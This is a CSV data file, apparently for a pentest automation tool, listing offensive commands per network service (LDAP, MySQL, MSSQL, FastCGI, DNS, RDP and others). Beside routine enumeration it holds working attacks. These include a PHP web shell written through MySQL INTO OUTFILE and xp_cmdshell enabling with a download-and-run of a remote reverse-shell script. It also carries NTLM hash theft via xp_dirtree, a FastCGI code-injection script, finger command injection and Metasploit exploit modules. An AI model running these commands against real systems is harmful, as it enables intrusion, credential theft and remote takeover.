Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# <ldapsearchcmd...> | grep -i -A2 -B2 ""userpas""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep ""Name:"" | sed -e ""s,\\\,\\\\\\\,g"" | awk '{print $2}' | while read name; do ./list-groups-for-user ""$name""; echo -e ""========================\n""; done

#Get users of a group
./enum-members --by-name ""domain admins""
./lsa enum-members --by-name ""domain admins""
#Get users of each group
./enum-groups | grep ""Name:"" | sed -e ""s,\\\,\\\\\\\,g"" | awk '{print $2}' | while read name; do echo ""$name""; ./enum-members --by-name ""$name""; echo -e ""========================\n""; done

#Get description of each user
./adtool -a search-user --name CN=""*"" --keytab=/etc/krb5.keytab -n <Username> | grep ""CN"" | while read line; do
    echo ""$line"";
    ./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn=""$line"" --attr ""description"";
    echo ""======================""
done
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# cat /var/lib/ldap/*.bdb | grep -i -a -E -o ""description.*"" | sort | uniq -u
",Unverified,1
Memcache,11211,None,NoNameAdded,No Description,"echo ""version"" | nc -vn -w 1 {IP} 11211      #Get version
echo ""stats"" | nc -vn -w 1 {IP} 11211        #Get status
echo ""stats slabs"" | nc -vn -w 1 {IP} 11211  #Get slabs
echo ""stats items"" | nc -vn -w 1 {IP} 11211  #Get items of slabs with info
echo ""stats cachedump <number> 0"" | nc -vn -w 1 {IP} 11211  #Get key names (the 0 is for unlimited output size)
echo ""get <item_name>"" | nc -vn -w 1 {IP} 11211  #Get saved info

#This php will just dump the keys, you need to use ""get <item_name> later""
sudo apt-get install php-memcached
php -r '$c = new Memcached(); $c->addServer(""localhost"", 11211); var_dump( $c->getAllKeys() );'
",Unverified,1
Memcache,11211,None,NoNameAdded,No Description,"# sudo apt install libmemcached-tools
memcstat --servers=127.0.0.1 #Get stats
memcdump --servers=127.0.0.1 #Get all items
memccat  --servers=127.0.0.1 <item1> <item2> <item3> #Get info inside the item(s)
",Unverified,1
Memcache,11211,None,NoNameAdded,No Description,"nmap -n -sV --script memcached-info -p 11211 {IP}   #Just gather info
msf > use auxiliary/gather/memcached_extractor      #Extracts saved data
msf > use auxiliary/scanner/memcached/memcached_amp #Check is UDP DDoS amplification attack is possible 
",Unverified,1
SSH/SFTP,22,None,NoNameAdded,No Description,"# nc -vn {IP} 22
",Unverified,1
SSH/SFTP,22,None,NoNameAdded,No Description,"usage: ssh-audit.py [-1246pbcnjvlt] <host>

   -1,  --ssh1             force ssh version 1 only
   -2,  --ssh2             force ssh version 2 only
   -4,  --ipv4             enable IPv4 (order of precedence)
   -6,  --ipv6             enable IPv6 (order of precedence)
   -p,  --port=<port>      port to connect
   -b,  --batch            batch output
   -c,  --client-audit     starts a server on port 2222 to audit client
                               software config (use -p to change port;
                               use -t to change timeout)
   -n,  --no-colors        disable colors
   -j,  --json             JSON output
   -v,  --verbose          verbose output
   -l,  --level=<level>    minimum output level (info|warn|fail)
   -t,  --timeout=<secs>   timeout (in seconds) for connection and reading
                               (default: 5)
$ python3 ssh-audit <IP>
",Unverified,1
SSH/SFTP,22,None,NoNameAdded,No Description,"ssh-keyscan -t rsa {IP} -p <PORT>
",Unverified,1
RMI,1098,None,NoNameAdded,No Description,"# msf> use auxiliary/scanner/misc/java_rmi_server
msf> use auxiliary/gather/java_rmi_registry
nmap -sV --script ""rmi-dumpregistry or rmi-vuln-classloader"" -p <PORT> <IP>
",Unverified,1
RMI,1098,None,NoNameAdded,No Description,"# msf> use exploit/multi/browser/java_rmi_connection_impl
",Unverified,1
IRC,194,None,NoNameAdded,No Description,"# nc -vn {IP} <PORT>
openssl s_client -connect {IP}:<PORT> -quiet
",Unverified,1
IRC,194,None,NoNameAdded,No Description,"#Connection with random nickname
USER ran213eqdw123 0 * ran213eqdw123
NICK ran213eqdw123
#If a PING :<random> is responded you need to send
#PONG :<received random>

VERSION
HELP
INFO
LINKS
HELPOP USERCMDS
HELPOP OPERCMDS
OPERATOR CAPA
ADMIN      #Admin info
USERS      #Current number of users
TIME       #Server's time
STATS a    #Only operators should be able to run this
NAMES      #List channel names and usernames inside of each channel -> Nombre del canal y nombre de las personas que estan dentro
LIST       #List channel names along with channel banner
WHOIS <USERNAME>      #WHOIS a username
USERHOST <USERNAME>   #If available, get hostname of a user
USERIP <USERNAME>     #If available, get ip of a user
JOIN <CHANNEL_NAME>   #Connect to a channel

#Operator creds Brute-Force
OPER <USERNAME> <PASSWORD>
",Unverified,1
IRC,194,None,NoNameAdded,No Description,"nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 {IP}
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds 
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"CONVERT(unhex(""6f6e2e786d6c55540900037748b75c7249b75""), BINARY)
CONVERT(from_base64(""aG9sYWFhCg==""), BINARY)
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"# show databases;
use <database>;
show tables;
describe <table_name>;

select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
select user,file_priv from mysql.user where user='root'; #File privileges
select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Try to execute code
select do_system('id');
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name=""<TABLE NAME>""

#Read & Write
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,""<?php echo shell_exec($_GET['c']);?>"",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"load data local infile ""/etc/passwd"" into table test FIELDS TERMINATED BY '\n';
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"mysql> load data infile ""/etc/passwd"" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"# cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v ""#"" | grep ""user""
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"mysql -u root --password=<PASSWORD> -e ""SELECT User,Host,authentication_string FROM mysql.user;""
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"# cat /etc/mysql/debian.cnf
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"# grep -oaE ""[-_\.\*a-Z0-9]{3,}"" /var/lib/mysql/mysql/user.MYD | grep -v ""mysql_native_password""
",Unverified,1
Finger,79,None,NoNameAdded,No Description,"# nc -vn {IP} 79
echo ""root"" | nc -vn {IP} 79
",Unverified,1
Finger,79,None,NoNameAdded,No Description,"finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user
",Unverified,1
Finger,79,None,NoNameAdded,No Description,"# finger-user-enum.pl -U users.txt -t 10.0.0.1
finger-user-enum.pl -u root -t 10.0.0.1
finger-user-enum.pl -U users.txt -T ips.txt
",Unverified,1
Finger,79,None,NoNameAdded,No Description,"finger ""|/bin/id@example.com""
finger ""|/bin/ls -a /@example.com""
",Unverified,1
X11,6000,None,NoNameAdded,No Description,"nmap -sV --script x11-access -p <PORT> {IP}
msf> use auxiliary/scanner/x11/open_x11
",Unverified,1
X11,6000,None,NoNameAdded,No Description,"xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
",Unverified,1
X11,6000,None,NoNameAdded,No Description,"xwd -root -screen -silent -display <Target{IP}:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
",Unverified,1
X11,6000,None,NoNameAdded,No Description,"# ./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
",Unverified,1
MSRPC,135,None,NoNameAdded,No Description,"# use auxiliary/scanner/dcerpc/endpoint_mapper
use auxiliary/scanner/dcerpc/hidden
use auxiliary/scanner/dcerpc/management
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
rpcdump.py <IP> -p 135
",Unverified,1
IMAP,143,None,NoNameAdded,No Description,"# nc -nv {IP} 143
openssl s_client -connect {IP}:993 -quiet
",Unverified,1
IMAP,143,None,NoNameAdded,No Description,"# $ curl -k 'imaps://1.2.3.4/INBOX' -X 'UID SEARCH ALL' --user user:pass
$ curl -k 'imaps://1.2.3.4/INBOX;UID=1' --user user:pass
",Unverified,1
IMAP,143,None,NoNameAdded,No Description,"# $ curl -k 'imaps://1.2.3.4/INBOX' -X 'FETCH 1:5 BODY[HEADER.FIELDS (SUBJECT FROM)]' --user user:pass -v 2>&1 | grep '^<'
",Unverified,1
NTP,123,None,NoNameAdded,No Description,"ntpq -c readlist <{IP}_ADDRESS>
ntpq -c readvar <{IP}_ADDRESS>
ntpq -c peers <{IP}_ADDRESS>
ntpq -c associations <{IP}_ADDRESS>
ntpdc -c monlist <{IP}_ADDRESS>
ntpdc -c listpeers <{IP}_ADDRESS>
ntpdc -c sysinfo <{IP}_ADDRESS>
",Unverified,1
NTP,123,None,NoNameAdded,No Description,"nmap -sU -sV --script ""ntp* and (discovery or vuln) and not (dos or brute)"" -p 123 {IP}
",Unverified,1
NTP,123,None,NoNameAdded,No Description,"ntpdc -n -c monlist {IP}
",Unverified,1
PDL-datastream,9100,None,NoNameAdded,No Description,"# nc -vn {IP} 9100
@PJL INFO STATUS      #CODE=40000   DISPLAY=""Sleep""   ONLINE=TRUE
@PJL INFO ID          # ID (Brand an version): Brother HL-L2360D series:84U-F75:Ver.b.26
@PJL INFO PRODINFO    #Product info
@PJL FSDIRLIST NAME=""0:\"" ENTRY=1 COUNT=65535  #List dir
@PJL INFO VARIABLES   #Env variales
@PJL INFO FILESYS     #?
@PJL INFO TIMEOUT     #Timeout variables
@PJL RDYMSG           #Ready message
@PJL FSINIT  
@PJL FSDIRLIST
@PJL FSUPLOAD         #Useful to upload a file
@PJL FSDOWNLOAD       #Useful to download a file
@PJL FSDELETE         #Useful to delete a file
",Unverified,1
PDL-datastream,9100,None,NoNameAdded,No Description,"nmap -sV --script pjl-ready-message -p <PORT> {IP}
",Unverified,1
PDL-datastream,9100,None,NoNameAdded,No Description,"# msf> use auxiliary/scanner/printer/printer_env_vars
msf> use auxiliary/scanner/printer/printer_list_dir
msf> use auxiliary/scanner/printer/printer_list_volumes
msf> use auxiliary/scanner/printer/printer_ready_message
msf> use auxiliary/scanner/printer/printer_version_info
msf> use auxiliary/scanner/printer/printer_download_file
msf> use auxiliary/scanner/printer/printer_upload_file
msf> use auxiliary/scanner/printer/printer_delete_file
",Unverified,1
FastCGI,9000,None,NoNameAdded,No Description,"#!/bin/bash

PAYLOAD=""<?php echo '<!--'; system('whoami'); echo '-->';""
FILENAMES=""/var/www/public/index.php"" # Exisiting file path

HOST=$1
B64=$(echo ""$PAYLOAD""|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE=""allow_url_include=1""$'\n'""allow_url_fopen=1""$'\n'""auto_prepend_file='data://text/plain\;base64,$B64'"" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
",Unverified,1
NetBios,137,None,NoNameAdded,No Description,"# PORT    STATE SERVICE    VERSION
137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
",Unverified,1
NetBios,137,None,NoNameAdded,No Description,"nmblookup -A {IP}
nbtscan {IP}/30
sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n {IP}
",Unverified,1
NetBios,137,None,NoNameAdded,No Description,"# PORT    STATE         SERVICE     VERSION
138/udp open|filtered netbios-dgm
",Unverified,1
NetBios,137,None,NoNameAdded,No Description,"# PORT      STATE SERVICE      VERSION
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
",Unverified,1
MongoDB,27017,None,NoNameAdded,No Description,"# show dbs
use <db>
show collections
db.<collection>.find()  #Dump the collection
db.<collection>.count() #Number of records of the collection
db.current.find({""username"":""admin""})  #Find in current db the username admin
",Unverified,1
MongoDB,27017,None,NoNameAdded,No Description,"nmap -sV --script ""mongo* and default"" -p 27017 {IP} #By default all the nmap mongo enumerate scripts are used
",Unverified,1
MongoDB,27017,None,NoNameAdded,No Description,"mongo <HOST>
mongo <HOST>:<PORT>
mongo <HOST>:<PORT>/<DB>
mongo <database> -u <username> -p '<password>'
",Unverified,1
MongoDB,27017,None,NoNameAdded,No Description,"nmap -n -sV --script mongodb-brute -p 27017 <ip>
",Unverified,1
MongoDB,27017,None,NoNameAdded,No Description,"# grep ""noauth.*true"" /opt/bitnami/mongodb/mongodb.conf | grep -v ""^#"" #Not needed
grep ""auth.*true"" /opt/bitnami/mongodb/mongodb.conf | grep -v ""^#\|noauth"" #Not needed
",Unverified,1
ndmp,10000,None,NoNameAdded,No Description,"nmap -n -sV --script ""ndmp-fs-info or ndmp-version"" -p 10000 {IP} #Both are default scripts
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"nmap -sV --script ""rsync-list-modules"" -p <PORT> {IP}
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"# rsync -av --list-only rsync://192.168.0.123/shared_name
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"# rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"# rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"# rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"# find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"searchsploit ""microsoft sql server""
nmap --script-help ""*ms* and *sql*""
msf> search mssql
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}
msf> use auxiliary/scanner/mssql/mssql_ping
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"#Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x ""whoami""
#Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

#this turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"xp_dirtree '\\<attacker_{IP}>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_{IP}>\any\thing'
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"# msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"# msf> auxiliary/admin/mssql/mssql_escalate_execute_as
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@{IP} #Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine

#Once logged in you can run queries:
SQL> select @@ version;

#Steal NTLM hash
sudo responder -I <interface> #Run that in other console
SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat

#Try to enable code execution
SQL> enable_xp_cmdshell

#Execute code, 2 sintax, for complex and non complex cmds
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(""http://10.10.14.13:8000/rev.ps1"") | powershell -noprofile'
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"sqsh -S {IP} -U <Username> -P <Password> -D <Database>
",Unverified,1
Postgresql,5432,None,NoNameAdded,No Description,"psql -U <myuser> # Open psql console with user
psql -h <host< -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
",Unverified,1
Postgresql,5432,None,NoNameAdded,No Description,"log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
",Unverified,1
Postgresql,5432,None,NoNameAdded,No Description,"sqlite3 pgadmin4.db "".schema""
sqlite3 pgadmin4.db ""select * from user;""
sqlite3 pgadmin4.db ""select * from server;""
string pgadmin4.db
",Unverified,1
EthernetIP,44818,None,NoNameAdded,No Description,"nmap -n -sV --script enip-info -p 44818 {IP}
pip3 install cpppo
python3 -m cpppo.server.enip.list_services [--udp] [--broadcast] --list-identity -a {IP}
",Unverified,1
Portmapper,111,None,NoNameAdded,No Description,"# root@kali:~# apt-get install nis
root@kali:~# ypwhich -d example.org 192.168.10.1
potatohead.example.org
root@kali:~# ypcat –d example.org –h 192.168.10.1 passwd.byname
tiff:noR7Bk6FdgcZg:218:101::/export/home/tiff:/bin/bash 
katykat:d.K5tGUWCJfQM:2099:102::/export/home/katykat:/bin/bash 
james:i0na7pfgtxi42:332:100::/export/home/james:/bin/tcsh 
florent:nUNzkxYF0Hbmk:199:100::/export/home/florent:/bin/csh 
dave:pzg1026SzQlwc:182:100::/export/home/dave:/bin/bash 
yumi:ZEadZ3ZaW4v9.:1377:160::/export/home/yumi:/bin/bash
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dig version.bind CHAOS TXT @DNS
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dig axfr @<DNS_{IP}> #Try zone transfer without domain
dig axfr @<DNS_{IP}> <DOMAIN> #Try zone transfer guessing the domain
fierce -dns <DOMAIN> #Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dig ANY @<DNS_{IP}> <DOMAIN>     #Any information
dig A @<DNS_{IP}> <DOMAIN>       #Regular DNS request
dig AAAA @<DNS_{IP}> <DOMAIN>    #{IP}v6 DNS request
dig TXT @<DNS_{IP}> <DOMAIN>     #Information
dig MX @<DNS_{IP}> <DOMAIN>      #Emails related
dig NS @<DNS_{IP}> <DOMAIN>      #DNS that resolves that name
dig -x 192.168.0.2 @<DNS_{IP}>   #Reverse lookup
dig -x 2a00:1450:400c:c06::93 @<DNS_{IP}> #reverse {IP}v6 lookup

#Use [-p PORT]  or  -6 (to use ivp6 address of dns)
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"nslookup
> SERVER <IP_DNS> #Select dns server
> 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...
> <IP_MACHINE> #Reverse lookup of a machine, maybe...
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"auxiliary/gather/enum_dns #Perform enumeration actions
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"#Perform enumeration actions
nmap -n --script ""(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"" <IP>
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dnsrecon -r 127.0.0.0/24 -n <{IP}_DNS>  #DNS reverse of all of the addresses
dnsrecon -r 127.0.1.0/24 -n <{IP}_DNS>  #DNS reverse of all of the addresses
dnsrecon -r <{IP}_DNS>/24 -n <{IP}_DNS>   #DNS reverse of all of the addresses
dnsrecon -d active.htb -a -n <{IP}_DNS> #Zone transfer
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <{IP}_DNS>
dnscan -d <domain> -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, https://github.com/rbsec/dnscan
",Unverified,1
DNS,53,None,NoNameAdded,No Description," #Query paypal subdomains to ns3.isc-sns.info
 nmap -sSU -p53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=paypal.com ns3.isc-sns.info
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dnsdict6 -s -t <domain>
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dnsrevenum6 pri.authdns.ripe.net 2001:67c:2e8::/48 #Will use the dns pri.authdns.ripe.net
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dig google.com A @{IP}
",Unverified,1
PPTP,1723,None,NoNameAdded,No Description,"nmap –Pn -sSV -p1723 {IP}
",Unverified,1
Service,2049,None,NoNameAdded,No Description,"nfs-ls #List NFS exports and check permissions
nfs-showmount #Like showmount -e
nfs-statfs #Disk statistics and info from NFS share
",Unverified,1
Service,2049,None,NoNameAdded,No Description,"scanner/nfs/nfsmount #Scan NFS mounts and list permissions
",Unverified,1
Service,2049,None,NoNameAdded,No Description,"# showmount -e {IP}
",Unverified,1
Service,2049,None,NoNameAdded,No Description,"mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
",Unverified,1
Service,2049,None,NoNameAdded,No Description,"mkdir /mnt/new_back
mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"rdesktop -u <username> {IP}
rdesktop -d <domain> -u <username> -p <password> {IP}
xfreerdp /u:[domain\]<username> /p:<password> /v:{IP}
xfreerdp /u:[domain\]<username> /pth:<hash> /v:{IP}
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"rdp_check <domain>/<name>:<password>@{IP}
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"nmap --script ""rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info"" -p 3389 -T4 {IP}
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"runas /netonly /user:<DOMAIN>\<NAME> ""cmd.exe"" #The password will be prompted
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"tscon <ID> /dest:<SESSIONNAME>
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"net localgroup ""Remote Desktop Users"" UserLoginName /add
",Unverified,1
Telnet,23,None,NoNameAdded,No Description,"# nc -vn {IP} 23
",Unverified,1
Telnet,23,None,NoNameAdded,No Description,"nmap -n -sV -Pn --script ""*telnet* and safe"" -p 23 {IP}
",Unverified,1
Telnet,23,None,NoNameAdded,No Description,"# /etc/inetd.conf
/etc/xinetd.d/telnet
/etc/xinetd.d/stelnet
",Unverified,1
epmd,4369,None,NoNameAdded,No Description,"echo -n -e ""\x00\x01\x6e"" | nc -vn {IP} 4369

#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
",Unverified,1
epmd,4369,None,NoNameAdded,No Description,"nmap -sV -Pn -n -T4 -p 4369 --script epmd-info {IP}

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672
",Unverified,1
